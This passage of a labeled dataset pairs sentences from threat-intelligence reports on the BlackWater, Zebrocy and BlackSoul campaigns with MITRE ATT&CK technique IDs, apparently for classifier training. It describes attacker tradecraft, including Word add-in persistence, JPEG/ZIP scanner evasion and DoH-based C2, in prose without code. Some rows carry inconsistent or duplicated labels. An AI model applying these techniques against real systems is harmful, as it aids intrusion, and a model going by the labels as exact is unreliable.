"quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The provider hosting the attack infrastructure promptly shot down the C2 servers after our notification on 7 August", "labels": ["TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* The attack used state-of-the-art techniques, such as DNS over HTTPs (DoH)", "labels": ["T1071"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* Based on the advanced TTPs and the discovered targets, we classify the threat actor as an Advanced Persistent Threat (APT) group named \u201cReconHellcat\u201d", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* Observed ReconHellcat targets consist of -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Further analysis attributed the analysed artifact to BlackWater: [a recently-discovered](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/) malware that uses\u00a0[Cloudflare Workers](https://blog.cloudflare.com/cloudflare-workers-unleashed/) as a C2 communication interface and DNS over HTTPS (DoH) as name resolution channel.", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Cloudflare promptly shutdown the C2 servers after our notification.", "labels": ["TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "On 5 August, a compressed archive was uploaded to [VirusTotal](https://www.virustotal.com/gui/file/b4ed39b6852bce329686ec44e2e8e39b1c0be9b7095cec2e1682e6e2ef724c69) from Azerbaijan, containing a malicious, macro-enabled Word Document (maldoc) themed for the recent explosion in Beirut.", "labels": ["T1566"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The name of the maldoc (*047-20 \u2013 OSCE Report Beirut explosion.doc*) might indicate attackers\u2019 intent to spoof the [Organization for Security and Co-operation in Europe](https://www.osce.org/) (OSCE), however, we discovered that attackers weaponized a legit Word document available in the web portal of the [Organismo Supervisor de las Contrataciones del Estado](https://www.gob.pe/en/osce) (OSCE), which is a supervisory body of the Peruvian Ministry of Economy.", "labels": ["T1566"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The maldoc contains an obfuscated macro that retrieves the second-stage encrypted payload from one of the three hardcoded C2 URLs depending on the user\u2019s Windows version.", "labels": ["TA0011", "T1059", "T1105", "T1082"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "To decrypt the payload, attackers implemented the old-fashion substitution cipher technique *[Book cipher](https://en.wikipedia.org/wiki/Book_cipher)*using the legit Windows file\u00a0`C:\\Windows\\Fonts\\cambriab.tff` as key.", "labels": ["T1140"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "To note that the content of this file differs depending on the Windows version , this is why the malicious macro checks the Windows version at the beginning of its execution, and contacts a specific URL depending of the result of this check.", "labels": ["T1059", "T1082", "TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Finally, the decrypted payload is written\u00a0in\u00a0`%APPDATA%\\\\Microsoft\\Word\\STARTUP\\Moon.wll`.", "labels": ["T1137"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "By\u00a0storing a Word add-in in such path allows Microsoft Word to load and execute it a malicious payload whenever it is launched.", "labels": ["T1137"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Although this technique ([T1137/006](https://attack.mitre.org/techniques/T1137/006/)) was firstly documented by F-Secure in 2017,\u00a0only this year researchers publicly reported two APT groups firstly using it: [Naikon APT](https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/) and [Vicious Panda](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/).", "labels": ["T1137", "G0019"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The malicious\u00a0`Moon.wll`contains another encrypted set of three different C2 URLs, and once executed by Word, it downloads an encrypted x64 executable as the final backdoor.", "labels": ["TA0011", "T1137", "T1027", "TA0011", "T1059", "T1105"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The decryption technique used to decrypt the x64 backdoor still uses the Windows font file as key, however, the C2 URL is passed as an encrypted parameter which is decrypted via a different substitution cipher relying on an hardcoded alphabet as a key.", "labels": ["TA0011", "T1140", "T1140"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Finally, the Blackwater backdoor starts communicating with the Clouldflare Worker via JSON.", "labels": ["T1071"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Notably, both the loader and the backdoor resolve the C2 hostnames via DNS-over-HTTP (DoH) by using a built-in feature of libcurl.", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Only the malicious Macro is using the system\u2019s default DNS server to get the first-stage payload.", "labels": ["T1059", "T1105"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "The C2 infrastructure was hosted on Cloudflare Workers platform, which is a service enabling users to register a subdomain and then have serverless code running to handle requests.", "labels": ["TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Our technical findings overlap with the Tactics, Techniques and Procedures (TTPs) previously attributed to the BlackWater malware campaign first identified in March:", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* Compressed archive containing a maldoc", "labels": ["T1566"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* DoH communications using\u00a0`cloudflare-dns.com`", "labels": ["TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "* C2 hosted on Cloudflare Workers service", "labels": ["TA0011"], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "As shown in the picture below, the analysis of the x64 sample revealed multiple strings containing the word \u201cBlackWater\u201d.", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "We researched the targets of both BlackWater campaigns (March and August) and concluded that -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan were highly likely targeted.", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "Since we have not found yet any solid overlap with any already-known APT group, we are naming the attackers behind the two BlackWater campaigns as \u201cReconHellcat\u201d.", "labels": [], "document": "quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy"}, {"sentence": "APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure", "labels": ["G0007", "T1566"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* On 9 August,\u00a0[QuoIntelligence](https://quointelligence.eu/) detected an ongoing APT28 campaign, which likely started on 5 August.", "labels": ["G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* The malware used in the attack was the Zebrocy Delphi version.", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* At the time of the discovery, the C2 infrastructure hosted in France was still live.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* Analysis revealed interesting correlations with ReconHell/BlackWater attack, which we [uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August.", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* As part of our responsible disclosure, we reported our findings to French authorities for taking down the C2, and to NATO for their awareness.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "On 9 August, QuoIntelligence disseminated a Warning to its government customers about a new APT28 (*aka* Sofacy, Sednit, Fancy Bear, STRONTIUM, etc.", "labels": ["G0007", "G0007", "G0007", "G0007", "G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "In particular, we found a malicious file uploaded to VirusTotal, which ultimately drops a Zebrocy malware and communicates with a C2 in France.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "After our discovery, we reported the malicious C2 to the French law enforcement as part of our responsible disclosure process.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Zebrocy is a malware used by APT28 (also known as Sofacy), which was reported by multiple security firms[[1]](#_ftn1)[[2]](#_ftn2)[[3]](#_ftn3)[[4]](#_ftn4)[[5]](#_ftn5)[[6]](#_ftn6) in the last two years.", "labels": ["G0007", "G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "This technique works because JPEG files are parsed from the beginning of the file and some Zip implementations parse Zip files from the end of the file (since the index is located there) without looking at the signature in the front.", "labels": ["T1027"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "The technique is also used by threat actors to evade AVs, or other filtering systems since they might mistake the file for a JPEG and skip it.", "labels": ["T1027"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Interestingly, in order to trigger the decompression of the file on Windows after the user clicks on it, the following conditions need to be met: \u00a0a) the file must be correctly named .zip(x); b) the file needs to be opened with WinRAR. The file will show an error message\u00a0claiming it is corrupted if the targeted victim uses WinZip or the default Windows utility.", "labels": ["T1204", "T1203", "T1204"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* Course 5 \u2013 16 October 2020.exe (Zebrocy malware)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 SHA256:\u00a0 aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Considering the lure uses a NATO image, the attackers likely picked the filenames in order to leverage upcoming [NATO courses](https://www.natoschool.nato.int/Academics/Portfolio/Course-Catalogue#2aid-aid) in October 2020.", "labels": ["T1566"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "The rationale could be that the attacker makes the user attempt to first open the XLS file, and then open the .exe with the same filename as a second try.", "labels": ["T1566"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "The .exe file has a PDF icon, so if file extensions are not shown, targeted users might be lured into opening the executable.", "labels": ["T1036"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Since 2015, [multiple](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) have already covered Zebrocy Delphi versions in-depth.", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Interestingly, last Zebrocy [observations](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) seemed to suggest a discontinuity of the Delphi versions in favor of a new one written in [Go language](https://securelist.com/a-zebrocy-go-downloader/89419/).", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "This padding is used to evade hash-matching security controls, since the dropped malware will always have a different file hash value.", "labels": ["T1036"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Next, the malware creates a new scheduled task, and it is executed with the /s\u00a0parameter", "labels": ["T1053"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "At a first glance, the data seems to be obfuscated and encrypted.", "labels": ["T1027"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Letting the sample talk to its actual C2 on the Internet did not change its actual behavior during our analysis.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "The malware sends POST requests about once per minute without getting a response back.", "labels": ["T1071"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "It is possible that this unresponsive behavior is due to the C2 determining the infected machine as not interesting.", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Lastly, the network traffic generated to the C2 triggers the following Emerging Threats (ET) IDS rule:", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* ET TROJAN Zebrocy Screenshot Upload\u201d (SID: 2030122)", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "By analyzing the Tactics, Techniques and Procedures (TTPs), the targeting, and the theme used as a lure, we have high confidence in attributing this attack to the well-known APT28/Zebrocy TTPs disclosed by the security community in the last year.", "labels": ["G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "Although we could not find any strong causation link yet or solid technical link between the two attacks, it should be noted the following points correlating with the ReconHellcat campaign [we uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) on August 11:", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* Both the compressed Zebrocy malware and the OSCE-themed lure used to drop the BlackWater backdoor were uploaded the same day, on 5 August.", "labels": ["T1027"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* OSCE and NATO are both organizations that have been targeted (directly or indirectly) by APT28 in the past.", "labels": ["G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* The victimology we identified for the ReconHellcat campaign is in line with the one targeted by the Zebrocy attack (i.e. similar type of government bodies).", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "The type of organizations targeted by both attacks is also in line with known APT28 victimology.", "labels": ["G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "* We assessed ReconHellcat as a high-capability APT group, like APT28.", "labels": ["G0007"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "[[1]](#_ftnref1) ESET, A1, April 2018, [Sednit update: Analysis of Zebrocy](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/)", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "[[3]](#_ftnref3) Kaspersky, A1, October 2018, [Shedding Skin \u2013 Turla\u2019s Fresh Faces](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/)", "labels": ["G0010"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "[[4]](#_ftnref4) Kaspersky, A1, Janurary 2019, [A Zebrocy Go Downloader](https://securelist.com/a-zebrocy-go-downloader/89419/)", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "[[5]](#_ftnref5) Kaspersky, A1, January 2019, [GreyEnergy\u2019s overlap with Zebrocy](https://securelist.com/greyenergys-overlap-with-zebrocy/89506/)", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "[[6]](#_ftnref6) Kaspersky, A1, June 2019, [Zebrocy\u2019s Multilanguage Malware](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/)", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "**Course 5 \u2013 16 October 2020.exe (Zebrocy malware)**", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "**Additional Zebrocy malware variants on VT**", "labels": [], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Execution**  | [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)  |", "labels": ["T1047"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/) |", "labels": ["T1140"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Discovery** | [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1135: Network Share Discovery](https://attack.mitre.org/techniques/T1135/) [T1120: Peripheral Device Discovery](https://attack.mitre.org/techniques/T1120/) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057/) [T1012: Query Registry](https://attack.mitre.org/techniques/T1012/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082/) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1049: System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124/) |", "labels": ["T1083", "T1135", "T1120", "T1057", "T1012", "T1082", "T1016", "T1049", "T1033", "T1124"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560/) [T1119: Automated Collection](https://attack.mitre.org/techniques/T1119/) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113/) |", "labels": ["T1560", "T1119", "T1113"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Command and Control** | [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) |", "labels": ["T1105"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "| **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) |", "labels": ["TA0011"], "document": "quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato"}, {"sentence": "ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware", "labels": ["T1566"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "On 27 November, QuoIntelligence detected a new malware, seemingly uploaded to VirusTotal by a user in Turkmenistan, which shares multiple similarities to the threat actor we previously dubbed ReconHellcat.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "The campaign ultimately delivers a **previously undocumented remote access Trojan (RAT), which we dubbed *BlackSoul*.** After promptly alerting our customers, we notified Cloudflare about the C2 infrastructure hosted on their [Workers service](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjk96Lux4buAhXUGFkFHeTyDCQQFjAAegQIARAC&url=https%3A%2F%2Fworkers.cloudflare.com%2F&usg=AOvVaw2Zt-uFSsvY_asdQQ5FHkKr)\u00a0as per our responsible disclosure process.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Further analysis revealed the malware being part of a targeted\u00a0campaign, that\u00a0likely originated with a spear phishing email delivering\u00a0a [CAB](https://www.virustotal.com/gui/file/690872b8d0205203029b2b388b27f15a7673e9c02dab99f76216efc4a305cd4c/detection) archive.", "labels": ["T1566"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "During our analysis, we determined 1-10-20-hb44\\_final.exe is a malicious loader, which uses obfuscation similar to the variant observed in the previously [reported](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) ReconHellcat campaign delivering BlackWater malware.", "labels": ["T1027", "T1105"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Another similarity is that the loader utilizes C2 infrastructure hosted on the Cloudflare Workers service.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Following a successful C2 connection, the loader retrieves two files: (1) an executable named *blacksoul*, and (2) a Dynamic-Link Library (DLL) named *blacksoulLib*. Additionally, the loader opens Microsoft Word with the aforementioned legitimate document from the NIST website. Essentially, ReconHellcat uses this legitimate document as a decoy.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "BlackSoul", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "The\u00a0second stage\u00a0executable is a\u00a0newly observed\u00a0malware family, which we\u00a0linked to the ReconHellcat threat actor.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "We named the malware\u00a0\u201cBlackSoul\u201d\u00a0to\u00a0match its\u00a0internal name, main class name, and\u00a0file name.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "*Figure 3: Class name \u201cBlackSoul\u201d*", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "The malware is a classical minimal RAT, which is capable of file transfers and running arbitrary commands.", "labels": ["T1041"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Through static analysis, we determined that the executable\u2019s main loop supports handling the following commands from its C2 server:", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **3** | paths | Likely retrieves\u00a0a\u00a0specified file\u00a0from the machine and uploads\u00a0it\u00a0to the C2.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **3** | paths | Likely retrieves\u00a0aspecified file\u00a0from the machine and uploads\u00a0it\u00a0to the C2.", "labels": ["T1041"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **4** | config | Updates\u00a0the configuration file (UsrClass.json)\u00a0which contains\u00a0C2 server info\u00a0and miscellaneous\u00a0fields.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "*Table 1: BlackSoul Commands and Actions Taken*", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "BlackSoul makes use of two files:", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "It is unclear if this file is mandatory or merely used to save existing configurations between invocations of BlackSoul.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "BlackSoul uses information gathered by blacksoulLib to call back to the C2 over the RESTful Strapi protocol and JSON based data encoding.", "labels": ["TA0011", "T1041", "T1041"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "The RAT\u2019s string obfuscation applies only to strings in the main program but excludes strings of third-party compiled in libraries.", "labels": ["T1027"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "BlackSoul additionally uses various other techniques for obfuscation.", "labels": ["T1027"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "In particular, strings are constructed dynamically on the stack and deobfuscated with a variety of mechanisms, such as a fixed key XOR cipher and a Caesar cipher using variable shift values.", "labels": ["T1140"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "The file is a DLL with a single export, Init(), which is called by BlackSoul.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Searching the victim\u2019s machine for Firefox, Chrome, and Opera data.", "labels": ["T1005"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Decoding a C2 URL later used by BlackSoul", "labels": ["T1140"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Generating further login information for the C2 and returning gathered data to BlackSoul in JSON format, including:", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "**Figure 5:** C2 URL decryption and setting of the URL parameter", "labels": ["TA0011", "T1140"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Based on our observations, the DLL\u2019s specific functionality adapts to various victims\u2019 environments, and the DLL outputs different C2 information for various targets.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "However, it is likely that the BlackSoul campaign targeted a government-related body based on the theme lure, since NIST develops and publicizes security compliance standard for the US Federal Government and any organization who handles government data.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "As well, previously observed ReconHellcat campaign targets consisted of primarily defense and diplomatic government bodies.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "When we initially discovered ReconHellcat, its campaign characteristics and Tactics, Techniques, and Procedures (TTPs) were unique enough to classify it as a new threat actor.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "During our analysis of the new BlackSoul campaign, we identified limited yet sufficient similarities overlapping with the earlier observed BlackWater campaign.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "As a result, we have high confidence attributing this attack to ReconHellcat.", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Similarities\u00a0to earlier ReconHellcat\u00a0campaigns:", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Usage of compressed archives, likely via spear phishing email links or attachments, to distribute the initial attack artifacts.", "labels": ["T1566", "T1566"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Similarities\u00a0between\u00a0ReconHellcat\u2018s\u00a0BlackSoul and BlackWater malware:\u00a0", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Resolves\u00a0the C2 hostnames via\u00a0DNS over HTTPS (DoH)\u00a0using a built-in feature of libcurl, aclient-side URL transfer library.", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Uses\u00a0Cloudflare Workers Service (*.workers[.]dev)\u00a0to host\u00a0C2\u00a0infrastructure.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* JSON\u2013encoded communications.", "labels": ["T1132"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "* Similar kind of randomized\u00a0login (user registration)\u00a0scheme with the\u00a0C2\u00a0server.", "labels": ["TA0011"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "To note, although we have not found a strong correlation or technical link between ReconHellcat and APT28, there are shared characteristics between the two groups, which we highlighted in our recent APT28 [reporting](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/).", "labels": ["G0007", "G0007"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "**BlackSoul**", "labels": [], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Initial Access**  | [T1566: Phishing](https://attack.mitre.org/techniques/T1566/)  |", "labels": ["T1566"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Execution**  | [T1204: User Execution](https://attack.mitre.org/techniques/T1204/)   |", 